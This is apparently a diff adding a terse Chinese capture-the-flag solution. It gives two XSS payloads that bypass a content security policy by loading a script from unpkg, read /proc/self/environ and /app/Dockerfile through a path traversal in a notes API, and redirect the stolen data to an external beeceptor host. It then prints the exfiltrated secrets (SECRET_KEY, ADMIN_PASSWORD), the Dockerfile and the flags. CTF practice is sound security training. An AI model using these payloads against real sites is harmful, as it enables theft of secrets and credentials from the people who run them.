@@ -1,0 +1,35 @@
+指令:
+<iframe srcdoc="<script src='https://unpkg.com/csp-bypass/dist/sval-classic.js'></script><br csp='fetch(`/api/notes?id=/proc/self/environ`).then(r=>r.json()).then(r=>top.location.href=`https://wille.free.beeceptor.com/`+JSON.stringify(r));'>\"></iframe>
+
+得到的內容:
+/%7B%22author%22:%22HOSTNAME=01c373c214a8
+/u0000SECRET_KEY=IwZOzaGCkoNO84ekMyrOAC27MP6JniZsGezwpRcsEhU
+/u0000PYTHON_PIP_VERSION=23.2.1
+/u0000SHLVL=1/u0000HOME=/home/ctf
+/u0000GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
+/u0000ADMIN_PASSWORD=hgytojZyeWVHGx0YZJeA9VZeSDPclVB8MsrVCfYMtk0
+/u0000PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/4cfa4081d27285bda1220a62a5ebf5b4bd749cdb/public/get-pip.py
+/u0000PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+/u0000LANG=C.UTF-8
+/u0000PYTHON_VERSION=3.12.1
+/u0000PWD=/app
+/u0000PYTHON_GET_PIP_SHA256=9cc01665956d22b3bf057ae8287b035827bfd895da235bcea200ab3b811790b6
+/u0000%22,%22content%22:%22%22,%22title%22:%22%22%7D \
+
+
+指令:
+<iframe srcdoc="<script src='https://unpkg.com/csp-bypass/dist/sval-classic.js'></script><br csp='fetch(`/api/notes?id=/app/Dockerfile`).then(r=>r.json()).then(r=>top.location.href=`https://wille.free.beeceptor.com/`+JSON.stringify(r));'>\"></iframe>
+
+得到的內容:
+/%7B%22author%22:%22FROM%20python:alpine%22,%22content%22:%22COPY%20.%20/app/n/nWORKDIR%20/app/n/n
+RUN%20adduser%20-D%20-u%201000%20ctf/n
+RUN%20chown%20-R%20ctf:ctf%20/app/n
+RUN%20chmod%20-R%20555%20/app%20&&%20chmod%20-R%20744%20/app/notes/n/n
+RUN%20mkdir%20-p%20/app/notes/admin%20&&%20rm%20-rf%20/app/notes/admin/*/n
+RUN%20UUID=$(python%20-c%20'import%20uuid;%20print(uuid.uuid4(),%20end=/%22/%22)')%20&&%20///n%20%20%20%20
+echo%20-e%20/%22admin//nFLAG1//nFLAG%7Bbyp4ss1ing_csp_and_xsssssssss%7D/%22%20%3E%20/%22/app/notes/admin/$UUID/%22%20/n/n
+RUN%20chmod%20-R%20555%20/app/notes/admin/n/n
+RUN%20echo%20'FLAG%7Bn0t_just_4n_xss%7D'%20%3E%20/%22/flag2-$(tr%20-dc%20'a-zA-Z0-9'%20%3C%20/dev/urandom%20%7C%20head%20-c%2016).txt/%22%20&&%20///n%20%20%20%20chmod%20444%20/flag2-*/n/nUSER%20ctf/n/n/nCMD%20[%20/%22sh/%22,%20/%22-c/%22,%20/%22flask%20run%20--host=0.0.0.0%20--port=5000/%22%20]%22,%22title%22:%22
+RUN%20pip3%20install%20flask%20redis%20rq%22%7D \
+
+FLAG{n0t_just_4n_xss}
